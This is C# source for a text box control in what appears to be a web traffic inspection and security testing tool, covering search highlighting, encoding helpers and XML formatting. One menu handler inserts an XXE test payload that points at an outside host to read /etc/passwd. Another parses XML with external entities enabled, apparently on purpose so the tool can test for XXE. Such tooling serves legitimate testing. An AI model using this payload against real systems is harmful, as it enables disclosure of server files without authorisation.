using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Text;
using System.Windows.Forms;
using TrafficViewerSDK;
using TrafficViewerSDK.Search;
using System.Text.RegularExpressions;
using TrafficViewerSDK.Options;
using TrafficViewerControls.Properties;
using System.Threading;
using System.Xml;
using System.IO;
using TrafficViewerInstance;
using TrafficViewerControls.DefaultExploiters;
using CommonControls;

namespace TrafficViewerControls.TextBoxes
{
	public partial class TrafficTextBox : UserControl
	{
		#region Fields

		private Color HIGHLIGHT_COLOR = TVColorConverter.GetColorFromString(TrafficViewerOptions.Instance.ColorHighlight);
		private ImmediateFinder _finderBox;
		private List<RtfHighlight> _currentFindHighlights;
		private SearchCriteria _currentFindSearchCriteria;
		private int _currentFindIndex = -1;
		private const int BIG_TEXT = 1000 * 1024; 
		private object _lock = new object();
		private Mutex _sync = new Mutex();
		RtfBuilder _builder = new RtfBuilder();

		#endregion

		#region Properties

		/// <summary>
		/// Gets or sets the text of the box
		/// </summary>
		public override string Text
		{
			get
			{
				return _textBox.Text;
			}
			set
			{
				if (value == null)
				{
					value = String.Empty;
				}


				//scroll to the top of the box
				_textBox.Select(0, 0);
				_textBox.ScrollToCaret();

				//cancel existing rtf building operations, these are most consuming operations under our control
				_builder.CancelRequested = true;

				//waits for the previous operation to complete
				
				if (value.Length > BIG_TEXT)
				{
					/**_textBox.Text = Resources.Loading;
					Thread worker = new Thread(RtfWorkerDoWork);
					//runs a new thread with the new value
					worker.Start(value);
					 * */
					value = value.Substring(0, BIG_TEXT) + "\r\nTRUNCATED...";
				}
				//stop any new threads from entering this area
				//gets a list of search highlights based on the current search criteria
				List<RtfHighlight> highlights = GetSearchHighlights(value, _autoSearchCriteria);
				//constructs the rtf of the rich text box taking the highlights into consideration, this is much more faster than using the text property
				string rtf = _builder.Convert(value, highlights.ToArray());

				if (!_builder.CancelRequested)
				{
					Rtf = rtf;
					ScrollToMatch(_textBox, _autoSearchCriteria, _lineMatch);
				}
				

			}
		}



		private void RtfWorkerDoWork(object sender)
		{
			string value = (string)sender;
			//gets a list of search highlights based on the current search criteria
			List<RtfHighlight> highlights = GetSearchHighlights(value, _autoSearchCriteria);
			//constructs the rtf of the rich text box taking the highlights into consideration, this is much more faster than using the text property
			string rtf = _builder.Convert(value, highlights.ToArray());
			//invoke setting the value of the texbox
			_textBox.Invoke((MethodInvoker)delegate
			{
				if (!_builder.CancelRequested)
				{
					Rtf = rtf;
					//scrolls to the first match or the clicked match (in the search box)
					ScrollToMatch(_textBox, _autoSearchCriteria, _lineMatch);
				}
				_sync.ReleaseMutex();
			});
		}

		/// <summary>
		/// Gets or sets the rich format code of the text box
		/// </summary>
		public string Rtf
		{
			get
			{
				return _textBox.Rtf;
			}
			set
			{
				_textBox.SuspendLayout();
				_textBox.Rtf = value;
				_textBox.ResumeLayout();
				//clear the immediate find highlights
				_currentFindHighlights = null;
				_currentFindIndex = -1;
				_currentFindSearchCriteria = null;
			}
		}

		private SearchCriteria _autoSearchCriteria;
		/// <summary>
		/// If non null elements matching this search criteria are automatically highlighted
		/// </summary>
		public SearchCriteria AutoSearchCriteria
		{
			get { return _autoSearchCriteria; }
			set { _autoSearchCriteria = value; }
		}

		private string _lineMatch;
		/// <summary>
		/// The line that a match was found on (for automated highlighting)
		/// </summary>
		public string LineMatch
		{
			get { return _lineMatch; }
			set { _lineMatch = value; }
		}

		/// <summary>
		/// Returns the Context Menu Strip for the current control
		/// </summary>
		public override ContextMenuStrip ContextMenuStrip
		{
			get
			{
				return _contextMenu;
			}
			set
			{
				_contextMenu = value;
			}
		}

		#endregion

		#region Private Methods

		/// <summary>
		/// Returns all highlights for the search
		/// </summary>
		/// <param name="text"></param>
		/// <param name="criteria"></param>
		private List<RtfHighlight> GetSearchHighlights(string text, SearchCriteria criteria)
		{

			List<RtfHighlight> result = new List<RtfHighlight>();

			//do we need to highlight a search match?
			if (criteria != null && text != null && text != String.Empty)
			{
				if (criteria.IsRegex)
				{
					try
					{
						foreach (string cText in criteria.Texts)
						{
							MatchCollection matches = Regex.Matches(text, cText, RegexOptions.IgnoreCase | RegexOptions.Singleline);
							foreach (Match m in matches)
							{
								result.Add(new RtfHighlight(m.Index, m.Length, HIGHLIGHT_COLOR, RtfHighlightType.Background));
							}
						}
					}
					catch
					{
						//ignore malformed regex
					}
				}
				else
				{
					int textStartIndex = 0;
					bool matchFound = false;
					foreach (string cText in criteria.Texts)
					{
						if (cText != String.Empty)
						{
							do
							{
								textStartIndex = text.IndexOf(cText, textStartIndex, StringComparison.OrdinalIgnoreCase);
								if (textStartIndex != -1)
								{
									result.Add(new RtfHighlight(textStartIndex, cText.Length, HIGHLIGHT_COLOR, RtfHighlightType.Background));
									textStartIndex += cText.Length;
									matchFound = true;
								}
								else
								{
									matchFound = false;
								}

							}
							while (matchFound);
						}
					}
				}
			}
			return result;
		}

		/// <summary>
		/// Scrolls to the current match or to the first highlight
		/// </summary>
		/// <param name="box"></param>
		/// <param name="criteria"></param>
		/// <param name="lineMatch"></param>
		private void ScrollToMatch(RichTextBox box, SearchCriteria criteria, string lineMatch)
		{
			int startIndex, lineStartIndex, textStartIndex;
			string searchContext;
			string text = box.Text;

			if (criteria != null)
			{

				//the user might select lines where the text was found from a search window, however the highlighting will 
				//also work when they don't, in that case the text is searched and highlighted in the whole textbox
				if (lineMatch == String.Empty)
				{
					searchContext = text;
					startIndex = 0;
				}
				else
				{
					lineStartIndex = text.IndexOf(lineMatch, StringComparison.CurrentCultureIgnoreCase);
					if (lineStartIndex > -1)
					{
						startIndex = lineStartIndex;
						searchContext = lineMatch;
					}
					else
					{
						searchContext = text;
						startIndex = 0;
					}
				}

				//locate the search text
				if (criteria.IsRegex)
				{
					try
					{
						int i = 0, n = criteria.Texts.Count;
						textStartIndex = -1;

						while (i < n && textStartIndex == -1)
						{
							Match m = Regex.Match(searchContext, criteria.Texts[i], RegexOptions.IgnoreCase);
							if (m.Captures.Count > 0)
							{
								textStartIndex = m.Index;
							}
							i++;
						}
					}
					catch
					{
						//ignore malformed regex
						textStartIndex = -1;
					}
				}
				else
				{
					int i = 0, n = criteria.Texts.Count;
					textStartIndex = -1;
					while (i < n && textStartIndex == -1)
					{
						textStartIndex = searchContext.IndexOf(criteria.Texts[i], StringComparison.OrdinalIgnoreCase);
						i++;
					}
				}

				if (textStartIndex > -1)
				{
					box.Select(startIndex + textStartIndex, 0);
					box.ScrollToCaret();
				}
			}
		}

		private void FindClicked(FindClickEventArgs e)
		{
			if (_currentFindSearchCriteria == null ||
				!_currentFindSearchCriteria.Equals(e.SearchCriteria))
			{
				//this is a new search
				_currentFindSearchCriteria = e.SearchCriteria;
				string boxText = _textBox.Text;
				_currentFindHighlights = GetSearchHighlights(boxText, _currentFindSearchCriteria);
				//constructs the rtf of the rich text box taking the highlights into consideration, this is much more faster than using the text property
				_textBox.Rtf = _builder.Convert(boxText, _currentFindHighlights.ToArray());

				if (_currentFindHighlights.Count != 0)
				{
					_finderBox.FindResult = FinderResult.Found;
				}
				else
				{
					_finderBox.FindResult = FinderResult.NotFound;
				}
			}

			FindNext();
		}

		private void FindNext()
		{
			if (_currentFindHighlights != null && _currentFindHighlights.Count > 0)
			{
				_currentFindIndex++;

				if (_currentFindIndex >= _currentFindHighlights.Count)
				{
					_currentFindIndex = 0;
				}

				RtfHighlight currentHighlight = _currentFindHighlights[_currentFindIndex];

				HighlightMatch(_textBox, currentHighlight);
			}
		}

		private void HighlightMatch(RichTextBox box, RtfHighlight currHighlight)
		{
			box.Focus();
			box.Select(currHighlight.Start, currHighlight.Length);
			box.ScrollToCaret();
		}

		private void FindAgainClick(object sender, EventArgs e)
		{
			FindNext();
		}

		#endregion

		#region Context Menu Actions

		/// <summary>
		/// Occurs when the find menu is clicked
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void FindMenuClick(object sender, EventArgs e)
		{
            if (_finderBox == null || _finderBox.IsDisposed)
            {
                InitFinderBox();
            }
			_finderBox.Text = _textBox.SelectedText;
			_finderBox.Show(this);
		}

		private void WrapToolStripMenuItemClick(object sender, EventArgs e)
		{
			_wrapMenu.Checked = !_wrapMenu.Checked;
			_textBox.WordWrap = _wrapMenu.Checked;
		}

		private void CutMenuClick(object sender, EventArgs e)
		{
			_textBox.Cut();
		}

		private void CopyMenuClick(object sender, EventArgs e)
		{
			_textBox.Copy();
		}

		private void PasteMenuClick(object sender, EventArgs e)
		{
			_textBox.SelectedText = Clipboard.GetText();
		}

		#region Encoding

		private void urlDecodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string decodedText = Utils.UrlDecode(_textBox.SelectedText);
			if (decodedText != null)
			{
				_textBox.SelectedText = decodedText;
			}
			else
			{
				MessageBox.Show(Resources.InvalidEncoding);
			}
		}

		private void urlEncodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Utils.UrlEncode(_textBox.SelectedText);
		}

		private void htmlDecodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string decodedText = Utils.HtmlDecode(_textBox.SelectedText);
			if (decodedText != null)
			{
				_textBox.SelectedText = decodedText;
			}
			else
			{
				MessageBox.Show(Resources.InvalidEncoding);
			}
		}

		private void htmlEncodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Utils.HtmlEncode(_textBox.SelectedText);
		}

		private void base64DecodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string decodedText = Utils.Base64Decode(_textBox.SelectedText);
			if (decodedText != null)
			{
				_textBox.SelectedText = decodedText;
			}
			else
			{
				MessageBox.Show(Resources.InvalidEncoding);
			}
		}

		private void base64EncodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Utils.Base64Encode(_textBox.SelectedText);
		}

		#endregion



		#endregion

		/// <summary>
		/// Selects a portion of text and scrolls to the selection
		/// </summary>
		/// <param name="start"></param>
		/// <param name="length"></param>
		public void Select(int start, int length)
		{
			_textBox.SelectAll();
			_textBox.SelectionBackColor = TVColorConverter.GetColorFromString(TrafficViewerOptions.Instance.ColorTextboxBackground);
			_textBox.Select(start, length);
			_textBox.SelectionBackColor = TVColorConverter.GetColorFromString(TrafficViewerOptions.Instance.ColorHighlight);
			_textBox.ScrollToCaret();
		}

		/// <summary>
		/// Constructor
		/// </summary>
		public TrafficTextBox()
		{
			InitializeComponent();
            InitFinderBox();

			_textBox.BackColor = TVColorConverter.GetColorFromString(TrafficViewerOptions.Instance.ColorTextboxBackground);
			_textBox.ForeColor = TVColorConverter.GetColorFromString(TrafficViewerOptions.Instance.ColorTextboxText);

		}

        private void InitFinderBox()
        {
            _finderBox = new ImmediateFinder();
            _finderBox.FindClicked += new FindClickEvent(FindClicked);
        }




		private void countToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MessageBox.Show(_textBox.SelectedText.Length.ToString());
		}

		private void FormatXMLClick(object sender, EventArgs e)
		{
			string selection = _textBox.SelectedText;
			try
			{
                
				MemoryStream stream = new MemoryStream();
				XmlTextWriter writer = new XmlTextWriter(stream, null);
				writer.Formatting = Formatting.Indented;

				XmlDocument doc = new XmlDocument();
                doc.XmlResolver = null;
				doc.LoadXml(selection);
               
                doc.Save(stream);
				stream.Flush();
				stream.Position = 0;
				byte[] bytes = new byte[stream.Length];
				stream.Read(bytes, 0, (int)stream.Length);
				_textBox.SelectedText = Constants.DefaultEncoding.GetString(bytes);
				writer.Close();

			}
			catch(Exception ex)
			{
				ErrorBox.ShowDialog(ex.Message);
			}

		}

        private void rToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = "__SeqVariable__myVar__random_string(10)__";
        }

        private void dateTimeMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = "__SeqVariable__myVar__ date_time_milliseconds()__";
        }

        private void incrementingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = "__SeqVariable__myVar__incrementing_integer(0,1)__";
        }

        private void insertSequenceVariableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = Regex.Unescape(Constants.SEQUENCE_VAR_PATTERN.Replace("(.+)","timestamp"));
        }

		private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Encryptor.EncryptToString(_textBox.SelectedText);
		}

		private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Encryptor.DecryptToString(_textBox.SelectedText);
		}

		private void insertFuzzStringToolStripMenuItem_Click(object sender, EventArgs e)
		{
			_textBox.SelectedText = Constants.FUZZ_STRING;

		}

        private void testXXEProcessingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string selection = _textBox.SelectedText;
            try
            {
                               
                XmlDocument doc = new XmlDocument();
                doc.LoadXml(selection);
                MessageBox.Show(doc.InnerText);

            }
            catch (Exception ex)
            {
                ErrorBox.ShowDialog(ex.Message);
            }

        }

        private void insertXXETestToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            string text = "<!DOCTYPE foo SYSTEM \"http://cloudcmd.mybluemix.net/dtd.php?file=/etc/passwd\">";
            text += "\n<foo>&e1;</foo>";
            _textBox.SelectedText = text;
        }

        private void urlEncodeEverythingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = Utils.UrlEncodeAll(_textBox.SelectedText);
        }


        private void aSCIIEncodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = Utils.ASCIIEncode(_textBox.SelectedText);
        }

        private void aSCIIDecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _textBox.SelectedText = Utils.ASCIIDecode(_textBox.SelectedText);
        }
       

        

        



	}
}
